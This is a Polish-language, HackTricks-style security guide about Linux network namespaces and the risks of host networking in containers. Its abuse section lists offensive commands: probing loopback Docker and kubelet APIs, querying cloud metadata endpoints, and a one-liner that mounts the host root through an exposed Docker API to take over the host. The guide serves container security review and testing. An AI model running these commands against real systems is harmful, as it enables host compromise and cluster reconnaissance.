# Przestrzeń nazw sieciowych

{{#include ../../../../../banners/hacktricks-training.md}}

## Przegląd

Namespace sieciowy izoluje zasoby związane z siecią, takie jak interfejsy, adresy IP, tablice routingu, stan ARP/neighbor, reguły firewalla, gniazda oraz zawartość plików takich jak `/proc/net`. Dlatego kontener może mieć coś, co wygląda jak własne `eth0`, własne lokalne trasy i własne urządzenie loopback, mimo że nie posiada rzeczywistego stosu sieciowego hosta.

Z punktu widzenia bezpieczeństwa ma to znaczenie, ponieważ izolacja sieci to coś więcej niż przypisanie portów. Prywatny namespace sieciowy ogranicza to, co workload może bezpośrednio obserwować lub rekonfigurować. Gdy ten namespace zostanie udostępniony hostowi, kontener może nagle uzyskać widoczność nasłuchów hosta, usług lokalnych hosta i punktów kontroli sieci, które nigdy nie miały być eksponowane aplikacji.

## Działanie

Świeżo utworzony namespace sieciowy zaczyna z pustym lub prawie pustym środowiskiem sieciowym, dopóki nie zostaną do niego dołączone interfejsy. Mechanizmy uruchamiania kontenerów tworzą lub łączą wtedy wirtualne interfejsy, przypisują adresy i konfigurują trasy, aby workload miał oczekiwaną łączność. W wdrożeniach opartych na bridge zwykle oznacza to, że kontener widzi interfejs oparty na veth podłączony do mostu hosta. W Kubernetes pluginy CNI obsługują równoważne ustawienia dla sieciowania Pod.

Ta architektura wyjaśnia, dlaczego `--network=host` lub `hostNetwork: true` to tak drastyczna zmiana. Zamiast otrzymać przygotowany prywatny stos sieciowy, workload dołącza do faktycznego stosu hosta.

## Lab

Możesz zobaczyć prawie pusty namespace sieciowy za pomocą:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Możesz porównać zwykłe kontenery i kontenery z siecią hosta za pomocą:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Kontener korzystający z sieci hosta nie ma już własnego, odizolowanego widoku gniazd i interfejsów. Sama ta zmiana jest już znacząca, zanim jeszcze zapytasz, jakie capabilities ma proces.

## Runtime Usage

Docker i Podman zazwyczaj tworzą prywatną przestrzeń nazw sieciowych dla każdego kontenera, chyba że skonfigurowano inaczej. Kubernetes zwykle przydziela każdemu Podowi własną przestrzeń nazw sieciowych, współdzieloną przez kontenery wewnątrz tego Podu, ale oddzielną od hosta. Systemy Incus/LXC także oferują rozbudowaną izolację opartą na przestrzeniach nazw sieciowych, często z większą różnorodnością wirtualnych konfiguracji sieciowych.

Zasadnicza zasada jest taka, że prywatna sieć jest domyślną granicą izolacji, podczas gdy host networking jest wyraźnym zrezygnowaniem z tej granicy.

## Misconfigurations

Najważniejszą nieprawidłową konfiguracją jest po prostu współdzielenie przestrzeni nazw sieciowych hosta. Robi się to czasem dla wydajności, niskopoziomowego monitoringu lub wygody, ale usuwa to jedną z najczystszych granic dostępnych dla kontenerów. Usługi nasłuchujące lokalnie na hoście stają się osiągalne w bardziej bezpośredni sposób, usługi dostępne tylko z localhost mogą stać się dostępne, a capabilities takie jak `CAP_NET_ADMIN` lub `CAP_NET_RAW` stają się znacznie bardziej niebezpieczne, ponieważ operacje, które umożliwiają, są teraz stosowane do środowiska sieciowego hosta.

Innym problemem jest nadmierne przyznawanie uprawnień związanych z siecią nawet wtedy, gdy przestrzeń nazw sieciowych jest prywatna. Prywatna przestrzeń nazw pomaga, ale nie czyni raw sockets ani zaawansowanej kontroli sieciowej nieszkodliwymi.

## Abuse

W słabo izolowanych konfiguracjach atakujący mogą przejrzeć usługi nasłuchujące na hoście, dotrzeć do management endpoints związanych tylko z loopback, sniff or interfere with traffic w zależności od dokładnych capabilities i środowiska, albo przekonfigurować routing i stan firewalla, jeśli obecne jest `CAP_NET_ADMIN`. W klastrze może to także ułatwić lateral movement i control-plane reconnaissance.

Jeśli podejrzewasz korzystanie z sieci hosta, zacznij od potwierdzenia, że widoczne interfejsy i nasłuchujące usługi należą do hosta, a nie do odizolowanej sieci kontenera:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Usługi dostępne tylko przez loopback są często pierwszym ciekawym odkryciem:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Jeśli network capabilities są dostępne, sprawdź, czy workload może przeglądać lub zmieniać widoczny stack:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
W środowiskach klastrowych lub chmurowych, sieć hosta również uzasadnia szybkie lokalne recon metadanych i usług control-plane-adjacent:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Pełny przykład: Host Networking + Local Runtime / Kubelet Access

Host networking nie zapewnia automatycznie host root, ale często udostępnia usługi, które są celowo osiągalne tylko z samego node'a. Jeśli jedna z tych usług jest słabo zabezpieczona, host networking staje się bezpośrednią ścieżką privilege-escalation.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet na localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Wpływ:

- bezpośrednie przejęcie hosta, jeśli lokalne API runtime jest wystawione bez odpowiedniej ochrony
- rozpoznanie klastra lub lateral movement, jeśli kubelet lub lokalne agenty są osiągalne
- manipulacja ruchem lub denial of service w połączeniu z `CAP_NET_ADMIN`

## Sprawdzenia

Celem tych sprawdzeń jest ustalenie, czy proces ma prywatny stos sieciowy, jakie trasy i nasłuchujące gniazda są widoczne oraz czy widok sieci już przypomina widok hosta, zanim jeszcze przetestujesz capabilities.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Warto zauważyć:

- Jeśli identyfikator przestrzeni nazw lub widoczny zestaw interfejsów przypomina hosta, może być już używana sieć hosta.
- `ss -lntup` jest szczególnie przydatny, ponieważ ujawnia nasłuchy dostępne tylko na loopback oraz lokalne punkty końcowe zarządzania.
- Trasy, nazwy interfejsów i kontekst firewalla stają się znacznie ważniejsze, jeśli obecne są `CAP_NET_ADMIN` lub `CAP_NET_RAW`.

Podczas przeglądu kontenera zawsze oceniaj przestrzeń nazw sieci razem z zestawem uprawnień. Sieć hosta w połączeniu z rozbudowanymi uprawnieniami sieciowymi to zupełnie inna postawa niż sieć mostkowa z wąskim, domyślnym zestawem uprawnień.
